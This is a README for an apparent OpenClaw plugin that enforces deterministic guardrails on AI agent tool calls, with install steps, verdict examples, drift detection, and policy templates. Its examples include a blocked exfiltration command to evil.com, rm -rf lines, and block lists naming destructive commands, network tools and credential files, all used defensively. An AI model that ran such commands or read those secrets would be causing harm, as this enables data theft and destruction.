# NeuroVerseOS Governance — OpenClaw Plugin

Deterministic governance runtime for OpenClaw agents.

This plugin converts your existing `.md` agent files into a structured `world.json` and enforces guardrails on tool execution.

No AI calls during enforcement. No network requests. Same world + same event = same verdict.

## Install

```bash
openclaw plugins install neuroverseos-governance
```

Or for local development:

```bash
openclaw plugins install -l .
```

### VPS / Cloud Server

The plugin must be installed **where your OpenClaw Gateway is running** — not on your local machine. If OpenClaw runs on a VPS, install the plugin there:

```bash
ssh your-vps
openclaw plugins install neuroverseos-governance
```

### Docker

For Docker-based deployments, add the plugin to your image or mount it at runtime:

**Option A — Install in your Dockerfile:**

```dockerfile
FROM openclaw/gateway:latest
RUN openclaw plugins install neuroverseos-governance
```

**Option B — Mount as a volume:**

```bash
docker run -v /path/to/neuroverseos-governance:/app/plugins/neuroverseos-governance \
  openclaw/gateway:latest
```

After either method, restart OpenClaw so the plugin loads:

```bash
docker restart openclaw-gateway
```

### Docker Compose

```yaml
services:
  openclaw:
    image: openclaw/gateway:latest
    volumes:
      - ./plugins/neuroverseos-governance:/app/plugins/neuroverseos-governance
      - ./.neuroverse:/app/.neuroverse  # persist audit logs and world.json
```

**Important:** The `.neuroverse/` directory contains your `world.json`, audit logs, and proposals. Mount it as a volume so governance state persists across container restarts.

## Quick Start

Inside your OpenClaw workspace:

```
/world bootstrap
```

This reads:

- `system.md`
- `tools.md`
- `constitution.md`
- `guardrails.md`
- `personality.md`
- `MEMORY.md` / `memory.md`

And generates:

```
.neuroverse/world.json
```

Governance is now active.

## What Happens at Runtime

Every tool call is evaluated through a deterministic pipeline:

1. **Invariants** — hard BLOCK, never overridable
2. **Guards** — PAUSE or BLOCK, scoped to tools
3. **Rules** — context-aware verdict (e.g. production requires review)
4. **Role constraints** — cannotDo = BLOCK, requiresApproval = PAUSE
5. **Default** — ALLOW

### Example: ALLOW

Safe operations pass silently (or with a log line if `verbose: true`):

```
[governance] ALLOW  shell → ls -la
             No rules matched — default allow
```

Audit log entry:

```jsonl
{"ts":1709000000,"id":"ev-001","tool":"shell","intent":"ls -la","status":"ALLOW","ruleId":null}
```

### Example: PAUSE

A guard condition matches, but the action is overridable. The agent stops and asks:

```
[governance] PAUSE  shell → rm -rf /data
             guard: destructive_shell_requires_approval
             evidence: "rm -rf"
             Allow? [y]es once / [a]lways / [n]o:
```

- **y** — allow this once, then resume
- **a** — allow for this guard for the rest of the session (session override)
- **n** — block it

Audit log shows both the verdict and the human decision:

```jsonl
{"ts":1709000001,"id":"ev-002","tool":"shell","intent":"rm -rf /data","status":"PAUSE","ruleId":"guard:destructive_shell","evidence":"rm -rf"}
{"ts":1709000005,"id":"ev-002","type":"decision","decision":"allow-once","decidedAt":1709000005}
```

### Example: BLOCK

An invariant fires. No override possible — the action is stopped immediately:

```
[governance] BLOCK  shell → curl https://evil.com/exfil?data=...
             invariant: no-data-exfiltration
             evidence: "exfil"
             This action has been blocked and cannot be overridden.
```

Audit log entry:

```jsonl
{"ts":1709000010,"id":"ev-003","tool":"shell","intent":"curl https://evil.com/exfil?data=...","status":"BLOCK","ruleId":"invariant:no-data-exfiltration","evidence":"exfil"}
```

### Example: Observe Mode

With `observeFirst: true`, the plugin logs what *would* have happened but allows everything:

```
[governance] ALLOW  shell → rm -rf /data
             [OBSERVE] Would have been PAUSE: destructive_shell_requires_approval
```

This lets you tune your `world.json` before going live.

## Commands

| Command | Description |
|---------|-------------|
| `/world bootstrap` | Generate `world.json` from your `.md` files |
| `/world status` | View governance metrics, drift detection, audit stats |
| `/world propose` | Generate amendment proposals from drift patterns |
| `/world approve <id>` | Approve a proposed amendment |
| `/world export` | Export for use in other NeuroVerse tools |

Also available as CLI commands via `openclaw world <subcommand>`.

## Constitution Drift Detection

### What is "drift"?

Your governance rules live in `world.json`. But `world.json` was generated *from* your `.md` files (`system.md`, `tools.md`, etc.) using `/world bootstrap`. If you later edit those `.md` files — adding a new rule, changing a policy, removing a guardrail — then `world.json` no longer matches what your `.md` files say. That gap is **drift**.

Think of it like this:

```
  system.md  ──bootstrap──▶  world.json  ──enforces──▶  agent actions
     ✏️ you edit this               ⚠️ this is now stale
```

The plugin catches this so your governance doesn't silently go out of date.

### How it works

The plugin stores a content hash of each `.md` file at bootstrap time (in `world.json` → `metadata.mdHashes`). A background service checks every 30 seconds whether the current file contents still match those hashes.

When drift is detected:

- `/world status` shows exactly which files changed since the last bootstrap
- On `/new` (session reset), you're prompted: **"Regenerate constitution? [y/n]"**
- No silent mutation — governance only updates when you explicitly re-run `/world bootstrap`

### Behavioral drift

The plugin also tracks **behavioral drift** — patterns in how governance is actually being used:

| Signal | What it means |
|---|---|
| Block rate > 30% | Rules may be too strict — agents are getting blocked constantly |
| Override rate > 50% | Humans keep overriding PAUSE decisions — the rules may need loosening |
| A specific tool blocked > 70% of the time | That tool probably needs a more nuanced guard |
| Zero blocks/pauses after 20+ actions | Rules may be too permissive — nothing is being caught |

Run `/world status` to see these signals, or `/world propose` to generate amendment suggestions based on the patterns.

## Audit Log

All verdicts are logged to:

```
.neuroverse/audit.jsonl
```

Append-only. One JSON object per line. Every PAUSE is paired with a decision record.

```jsonl
{"ts":1709000000,"id":"ev-001","tool":"shell","intent":"ls","status":"ALLOW","ruleId":null}
{"ts":1709000001,"id":"ev-002","tool":"shell","intent":"rm -rf /data","status":"BLOCK","ruleId":"invariant:no-destructive-ops","evidence":"rm -rf"}
```

## World File Structure

```json
{
  "version": "1.0.0",
  "kernel": {
    "enforcementMode": "standard",
    "defaultVerdict": "allow",
    "evaluationOrder": ["invariants", "guards", "rules"],
    "sessionOverridesAllowed": true
  },
  "invariants": [],
  "guards": [],
  "rules": [],
  "roles": [],
  "metadata": {}
}
```

## Starter Policy Templates

These are copy-paste examples you can add directly to your `world.json`. Mix and match to build your governance baseline.

### Block destructive shell commands (Invariant)

Never allow `rm -rf`, `mkfs`, or `dd` — no override possible:

```json
{
  "id": "no-destructive-ops",
  "description": "Block destructive shell commands (rm -rf, mkfs, dd)",
  "scope": ["tool_call"],
  "condition": {
    "field": "intent",
    "operator": "contains_any",
    "value": ["rm -rf", "mkfs", "dd if="]
  },
  "enforcement": "block"
}
```

Add to the `invariants` array.

### Require approval for external network access (Guard)

Pause on `curl`, `wget`, `fetch` — human decides:

```json
{
  "id": "external-network-approval",
  "description": "Require approval before making external network requests",
  "scope": ["tool_call"],
  "appliesTo": ["shell", "http", "fetch"],
  "condition": {
    "field": "intent",
    "operator": "contains_any",
    "value": ["curl", "wget", "fetch", "http://", "https://"]
  },
  "enforcement": "pause",
  "requiresApproval": true
}
```

Add to the `guards` array.

### Block access to secrets and credentials (Invariant)

Prevent reading `.env`, private keys, or credential files:

```json
{
  "id": "no-secret-access",
  "description": "Block access to secrets, keys, and credential files",
  "scope": ["tool_call"],
  "condition": {
    "field": "intent",
    "operator": "contains_any",
    "value": [".env", "id_rsa", "credentials.json", "secret", ".pem", "private_key"]
  },
  "enforcement": "block"
}
```

Add to the `invariants` array.

### Require approval in production (Rule)

In production environments, all tool calls need review:

```json
{
  "id": "production-requires-review",
  "description": "All tool actions require approval in production",
  "trigger": {
    "field": "environment",
    "operator": "==",
    "value": "production"
  },
  "effect": {
    "verdict": "pause"
  }
}
```

Add to the `rules` array.

### Restrict a read-only agent role (Role)

Create an agent role that can read but not write or execute:

```json
{
  "id": "readonly-agent",
  "name": "reader",
  "canDo": ["read_file", "glob", "grep", "search"],
  "cannotDo": ["shell", "write_file", "edit_file", "http"],
  "requiresApproval": false
}
```

Add to the `roles` array.

### Minimal starter world.json

A complete working example combining the above:

```json
{
  "version": "1.0.0",
  "kernel": {
    "enforcementMode": "standard",
    "defaultVerdict": "allow",
    "evaluationOrder": ["invariants", "guards", "rules"],
    "sessionOverridesAllowed": true
  },
  "invariants": [
    {
      "id": "no-destructive-ops",
      "description": "Block destructive shell commands",
      "scope": ["tool_call"],
      "condition": {
        "field": "intent",
        "operator": "contains_any",
        "value": ["rm -rf", "mkfs", "dd if="]
      },
      "enforcement": "block"
    },
    {
      "id": "no-secret-access",
      "description": "Block access to secrets and credential files",
      "scope": ["tool_call"],
      "condition": {
        "field": "intent",
        "operator": "contains_any",
        "value": [".env", "id_rsa", "credentials.json", ".pem"]
      },
      "enforcement": "block"
    }
  ],
  "guards": [
    {
      "id": "external-network-approval",
      "description": "Require approval for external network requests",
      "scope": ["tool_call"],
      "appliesTo": ["shell", "http", "fetch"],
      "condition": {
        "field": "intent",
        "operator": "contains_any",
        "value": ["curl", "wget", "fetch"]
      },
      "enforcement": "pause",
      "requiresApproval": true
    }
  ],
  "rules": [],
  "roles": [],
  "metadata": {
    "name": "Starter Governance",
    "bootstrappedFrom": [],
    "bootstrappedAt": 0
  }
}
```

Save this as `.neuroverse/world.json` and governance is immediately active. Or use `/world bootstrap` to generate one from your `.md` files instead.

## Configuration

In your OpenClaw plugin config:

| Option | Type | Description |
|--------|------|-------------|
| `worldPath` | string | Path to world.json (default: `.neuroverse/world.json`) |
| `enforcement` | string | `strict`, `standard`, or `permissive` |
| `observeFirst` | boolean | Start in observe mode (ALLOW all, record patterns) |
| `verbose` | boolean | Log all verdicts including ALLOW |
| `autoAllow` | boolean | Auto-approve all PAUSE decisions (for CI/headless) |
| `driftTracking` | boolean | Enable background drift monitoring |
| `environment` | string | Override environment detection |

## Agent Tool

The plugin registers a `world_proposal_create` tool that agents can call to propose governance amendments. The human must approve with `/world approve <id>`.

## License

Apache 2.0
